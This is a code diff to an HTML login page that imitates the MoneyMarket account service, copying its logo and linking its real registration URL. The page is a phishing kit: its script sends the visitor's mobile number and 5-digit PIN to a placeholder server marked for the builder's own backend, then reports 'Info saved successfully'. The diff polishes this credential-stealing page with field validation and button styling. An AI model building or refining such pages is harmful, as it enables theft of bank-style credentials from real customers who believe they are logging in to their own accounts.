@@ -8,7 +8,8 @@
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background: #d11d34 url('bg.jpeg'); /* use your red patterned background image */
+      background: #d11d34 url('bg.jpeg') no-repeat center center fixed;
+      background-size: cover;
       color: white;
       display: flex;
       flex-direction: column;
@@ -52,7 +53,7 @@
 
     .helper-text {
       font-size: 14px;
-      color: #ffc107; /* yellow for the links */
+      color: #ffc107;
       text-align: right;
       margin: -8px 0 10px;
       cursor: pointer;
@@ -95,53 +96,74 @@
 
 <body>
   <div class="container">
-   <img src="logo.png" alt="MoneyMarket Logo" style="width: 240px; margin-bottom: 10px; display: block; margin-left: auto; margin-right: auto;">
+  <h1>Login to your</h1>
+    <img src="logo.png" alt="MoneyMarket Logo" style="width: 240px; margin-bottom: 10px; display: block; margin-left: auto; margin-right: auto;">
 
-    <h1>Login to your</h1>
-    <div class="sub-title">MoneyMarket account</div>
+  
+  
 
     <div style="margin-top: 20px;">
-      <input type="text" placeholder="Your mobile number">
+      <input id="phone" type="text" placeholder="Your mobile number">
       <div class="helper-text">I forgot / changed my mobile number</div>
 
-      <input type="password" placeholder="Your 5-digit PIN">
+      <input id="pin" type="password" placeholder="Your 5-digit PIN">
       <div class="helper-text">I forgot my PIN</div>
     </div>
 
-    <button class="btn btn-primary" >Login</button>
-    <button class="btn btn-outline" src= url('https://app.moneymarketaccount.co.za/enhanced-onboarding/register')>Open an account</button>
+    <button id="loginBtn" class="btn btn-primary" disabled>Login</button>
+    <button class="btn btn-outline" onclick="window.location.href='https://app.moneymarketaccount.co.za/enhanced-onboarding/register'">
+      Open an account
+    </button>
 
     <div class="terms">Read our <a href="#">T&Cs</a></div>
   </div>
   
- <script>
-  const loginBtn = document.querySelector('.btn-primary');
-  const phoneInput = document.querySelector('input[type="text"]');
-  const pinInput = document.querySelector('input[type="password"]');
+  <script>
+    const loginBtn = document.getElementById('loginBtn');
+    const phoneInput = document.getElementById('phone');
+    const pinInput = document.getElementById('pin');
 
-  loginBtn.addEventListener('click', async () => {
-    const number = phoneInput.value.trim();
-    const pin = pinInput.value.trim();
-
-    try {
-      const res = await fetch('https://YOUR_SERVER_URL/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ number, pin })
-      });
-
-      const data = await res.json();
-      if (res.ok) {
-        alert('✅ Info saved successfully');
+    function validateFields() {
+      if (phoneInput.value.trim() && pinInput.value.trim()) {
+        loginBtn.disabled = false;
+        loginBtn.style.backgroundColor = '#ffc107';
+        loginBtn.style.color = '#000';
+        loginBtn.style.cursor = 'pointer';
       } else {
-        alert(data.message);
+        loginBtn.disabled = true;
+        loginBtn.style.backgroundColor = '#ddd';
+        loginBtn.style.color = '#999';
+        loginBtn.style.cursor = 'not-allowed';
       }
-    } catch (err) {
-      alert('❌ Server error');
     }
-  });
-</script>
 
+    phoneInput.addEventListener('input', validateFields);
+    pinInput.addEventListener('input', validateFields);
 
+    loginBtn.addEventListener('click', async () => {
+      const number = phoneInput.value.trim();
+      const pin = pinInput.value.trim();
+
+      try {
+        const res = await fetch('https://YOUR_SERVER_URL/submit', { // ✅ Replace with your backend URL
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ number, pin })
+        });
+
+        const data = await res.json();
+        if (res.ok) {
+          alert('✅ Info saved successfully');
+          phoneInput.value = '';
+          pinInput.value = '';
+          validateFields();
+        } else {
+          alert(data.message);
+        }
+      } catch (err) {
+        alert('❌ Server error');
+      }
+    });
+  </script>
 </body>
 </html>
